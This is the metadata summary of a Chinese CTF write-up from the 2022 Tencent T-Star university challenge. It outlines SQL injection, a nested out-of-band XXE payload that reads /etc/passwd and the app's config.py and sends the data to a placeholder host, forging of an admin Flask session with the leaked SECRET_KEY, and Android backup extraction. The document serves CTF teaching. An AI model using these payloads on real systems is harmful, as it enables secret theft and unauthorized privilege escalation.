...
- id注入
- XXE
- file:///proc/self/cwd/config.py
- error SYSTEM
- abe.jar
- data.ab
- Android Backup
attack_chain:
- 'Q1 Flask: /api/info?id=1 → ''No such streamer'' 提示 SQL 注入'
- POST /api/like json={"id":"1"} 触发 ORM / 拼 SQL
- 'Q2 XXE: POST /api/like Content-Type: application/xml'
- <!ENTITY % x SYSTEM 'file:///etc/passwd'>
- '嵌套 OOB XXE: %x → %y → %z → error SYSTEM ''http://vpsip/?p=%x'' (base64 数据外带)'
- 读 /proc/self/cwd/config.py → SECRET_KEY
- 伪造 admin session 提权
- 'Misc: java -jar abe.jar unpack data.ab data.tar yun202203 (Android backup extract)'
...
quality: high
full_path: 2022_未知之境_腾讯网络安全T-Star高校挑战赛_WriteUp.full.md
meta_path: 2022_未知之境_腾讯网络安全T-Star高校挑战赛_WriteUp.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: '2022 未知之境 腾讯网络安全 T-Star 高校挑战赛 WriteUp。Flask SQLi + XXE OOB data exfil + Android backup 解包。关键路径：Q1 Flask: /api/info?id=1 → ''No such streamer'' 提示 SQL 注入 → POST /api/like json={"id":"1"} 触...'
category: web
...
contest_type: school
wp_url: https://www.ctfiot.com/37683.html
reasoning_chain:
- '[触发点] /api/info?id=1 → ''No such streamer'' → 假设：SQL 注入 / [动作] POST /api/like json={"id":"1"} 触发 ORM 拼 SQL / [观察] / [下一步] XXE'
- '[触发点] Content-Type: application/xml + <!ENTITY % x SYSTEM ''file:///etc/passwd''> → 假设：OOB XXE / [动作] 嵌套 %x → %y → %z → error SYSTEM ''http://vpsip/?p=%x'' / [观察] /etc/passwd / [下一步] config.py'
- '[触发点] file:///proc/self/cwd/config.py → 假设：拿 SECRET_KEY / [动作] OOB XXE / [观察] SECRET_KEY / [下一步] 伪造 session'
- '[触发点] 伪造 admin session → 假设：Flask session 签名 / [动作] itsdangerous 签 / [观察] admin 提权 / [下一步] Misc'
- '[触发点] java -jar abe.jar unpack data.ab data.tar yun202203 → 假设：Android Backup / [动作] abe unpack / [观察] /data.tar / [下一步] 拿 flag'
failed_attempts:
- 试图直接 JSON 注入 → 失败：ORM 拼接
- 试图内联 XXE → 失败：无回显 → 必须 OOB
key_observations:
- Flask session 密钥泄露 + XXE OOB 数据外带是 web 中级标配
- abe.jar unpack 是 Android backup 拆 tar 工具
- OOB XXE 三层嵌套 (%x→%y→%z→error) 是出网 trick
prerequisites:
- SQL 注入基础
- OOB XXE 三层嵌套
- Flask session 签名 (itsdangerous)
- Android Backup (abe.jar)
---
